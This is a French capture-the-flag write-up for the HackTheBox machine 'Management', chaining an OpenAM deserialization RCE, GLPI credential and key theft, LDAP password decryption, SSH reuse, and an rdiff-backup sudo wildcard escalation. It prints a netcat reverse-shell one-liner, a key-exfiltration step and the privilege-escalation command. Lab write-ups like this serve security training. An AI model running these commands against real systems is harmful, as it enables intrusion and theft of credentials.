# Write-up -- HackTheBox : Management

Write-up réalisé pour la machine Management de HackTheBox. La chaîne d'exploitation enchaîne une RCE pré-authentification sur OpenAM (CVE-2026-33439) via désérialisation Java malveillante, la récupération de credentials GLPI depuis une base MariaDB, le déchiffrement d'un mot de passe LDAP chiffré en XChaCha20-Poly1305 avec la clé applicative, une réutilisation de mot de passe pour obtenir un accès SSH, et enfin une escalade de privilèges via `rdiff-backup` autorisé en sudo en exploitant le wildcard `*` pour copier le home de root dans `/tmp`.

L'IP de la machine pendant ma session était `10.129.97.87`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -sS -sV -sC -p- 10.129.97.87
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.97.87/
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://management.htb/
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
1689/tcp  open  java-rmi Java RMI
| rmi-dumpregistry:
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
4444/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
46503/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
```

**7 ports ouverts** : SSH sur le 22, HTTP/HTTPS sur le 80/443, deux ports Java RMI sur le 1689 et le 46503, et deux ports LDAP sur le 4444 (SSL) et le 50389. Le certificat TLS révèle le domaine `management.htb` et un wildcard `*.management.htb`. On ajoute `management.htb` à `/etc/hosts` :

```bash
sudo nano /etc/hosts
# 10.129.97.87  management.htb
```

---

## Étape 2 -- Découverte du sous-domaine sso.management.htb

On enumère les sous-domaines avec gobuster en mode vhost :

```bash
gobuster vhost -u https://management.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -k
```

```
sso.management.htb  Status: 302 [--> https://sso.management.htb/openam/]
```

On ajoute `sso.management.htb` à `/etc/hosts` et on visite l'URL. On arrive sur une page de login **OpenAM** : un système open source de gestion des identités et de contrôle des accès, également plateforme de fédération d'identités.

---

## Étape 3 -- CVE-2026-33439 : RCE pré-authentification sur OpenAM

Une recherche sur les CVE connues pour OpenAM révèle la **CVE-2026-33439** : une vulnérabilité critique d'exécution de code à distance avant authentification, due à une désérialisation non sécurisée du paramètre `jato.clientSession` (framework JATO). Le script injecte un objet Java sérialisé malveillant (gadget Click→Xalan) dans ce paramètre. Quand OpenAM désérialise l'objet, le gadget exécute la commande passée dans l'en-tête `cmd` et renvoie le résultat dans la réponse HTTP.

Un exploit est disponible sur GitHub : https://github.com/infernosalex/CVE-2026-33439-Python-PoC

On vérifie que la cible est vulnérable :

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
```

```
[+] HTTP 200
uid=996(openam) gid=987(openam) groups=987(openam)
```

La RCE fonctionne. On démarre un listener puis on injecte un reverse shell :

```bash
# Sur notre machine
nc -lvnp 4444
```

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.190 4444 >/tmp/f'
```

Le listener reçoit la connexion. On stabilise le shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On est connecté en tant qu'utilisateur `openam`.

---

## Étape 4 -- Fouille et découverte de la configuration GLPI

On s'aperçoit rapidement qu'on ne peut pas accéder au home de `owen` :

```bash
openam@management:/home$ cd owen
bash: cd: owen: Permission denied
```

Il faut pivoter. On fouille (longtemps) le système et on tombe sur un fichier de configuration de base de données dans `/opt/glpi/config/` :

```bash
openam@management:/opt/glpi/config$ cat config_db.php
```

```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

---

## Étape 5 -- Extraction du mot de passe LDAP depuis MariaDB

On se connecte à la base avec les credentials récupérés :

```bash
mysql -u glpi -h localhost -p8rhu0L6Pw4Y7
```

On liste les tables de `glpidb`. La table `glpi_users` ne contient rien d'utile, mais `glpi_authldaps` est plus intéressante :

```sql
MariaDB [glpidb]> SELECT id, name, host, rootdn, rootdn_passwd FROM glpi_authldaps;
```

```
| id | name                 | host               | rootdn                                       | rootdn_passwd                                                            |
|  1 | Management Directory | sso.management.htb | cn=svc-glpi,ou=services,dc=management,dc=htb | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== |
```

Un mot de passe chiffré pour le compte de service LDAP `svc-glpi`. Il faut le déchiffrer.

---

## Étape 6 -- Déchiffrement du mot de passe GLPI (XChaCha20-Poly1305)

Après quelques recherches, on apprend que GLPI chiffre ses mots de passe sensibles avec **libsodium XChaCha20-Poly1305**, en utilisant une clé applicative stockée dans `glpicrypt.key`. On récupère ce fichier depuis `/opt/glpi/config/` et on l'exfiltre vers notre machine via un serveur HTTP temporaire :

```bash
# Sur openam
cp /opt/glpi/config/glpicrypt.key /tmp/glpicrypt.key
python3 -m http.server 8000

# Sur notre machine
wget http://management.htb:8000/glpicrypt.key
```

On écrit un script Python pour déchiffrer la valeur :

```python
import argparse, base64, sys
from pathlib import Path
from nacl.bindings import crypto_aead_xchacha20poly1305_ietf_decrypt
from nacl.exceptions import CryptoError

parser = argparse.ArgumentParser()
parser.add_argument("--key")
parser.add_argument("--value")
args = parser.parse_args()

key = Path(args.key).read_bytes()
try:
    blob = base64.b64decode(args.value, validate=True)
    nonce, ciphertext = blob[:24], blob[24:]
    plaintext = crypto_aead_xchacha20poly1305_ietf_decrypt(ciphertext, nonce, nonce, key)
except (ValueError, CryptoError) as err:
    sys.exit(f"Decryption failed: {err}")

sys.stdout.buffer.write(plaintext + b"\n")
```

On l'exécute :

```bash
python3 decrypt.py \
  --key glpicrypt.key \
  --value 'avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=='
```

```
WpczC40GhTbk
```

On obtient le mot de passe du compte de service LDAP. On tente une réutilisation de mot de passe sur l'utilisateur `owen` en SSH :

```bash
ssh owen@management.htb
# Password: WpczC40GhTbk
```

Connexion réussie.

---

## Étape 7 -- Flag user

```bash
owen@management:~$ cat user.txt
```

**Flag user :** `2ff...`

---

## Étape 8 -- Découverte du vecteur d'escalade : rdiff-backup en sudo

On vérifie les droits sudo de `owen` :

```bash
owen@management:~$ sudo -l
```

```
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
```

`rdiff-backup` est un outil de sauvegarde incrémentale qui peut opérer en mode client-serveur sur deux processus distincts. La commande autorisée lance rdiff-backup en mode `--server` avec un accès limité à `/opt/backup` en lecture seule. Cependant, le wildcard `*` en fin de ligne permet d'injecter des arguments supplémentaires, notamment un second `--restrict-path` qui écrase la restriction initiale.

---

## Étape 9 -- Escalade de privilèges via rdiff-backup et flag root

Le mode `--server` de rdiff-backup est conçu pour être piloté par un processus client distant via `--remote-schema`. L'option `--remote-schema` permet de spécifier la commande exacte utilisée pour lancer le serveur distant, en substituant `%s` par le chemin source. En passant la commande sudo autorisée dans `--remote-schema` et en utilisant la location spéciale `/::/root` comme source (qui mappe `/root` sur le serveur distant), on force le serveur à traiter `/root` comme chemin source tout en injectant un second `--restrict-path /` qui écrase la restriction sur `/opt/backup` :

```bash
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/rootdir
```

```
WARNING: this command line interface is deprecated and will disappear...
NOTE: Starting mirror from source path /root to destination path /tmp/rootdir
```

On vérifie le résultat dans `/tmp/rootdir` :

```bash
owen@management:/tmp/rootdir$ ls -la
```

```
-rw-r-----  1 owen owen   33 Sep 22 06:19 root.txt
drwx------  2 owen owen 4096 Sep  7 11:41 .ssh
```

Le contenu de `/root` a été copié avec succès, et les fichiers nous appartiennent maintenant. On lit le flag :

```bash
owen@management:/tmp/rootdir$ cat root.txt
```

**Flag root :** `b26...`
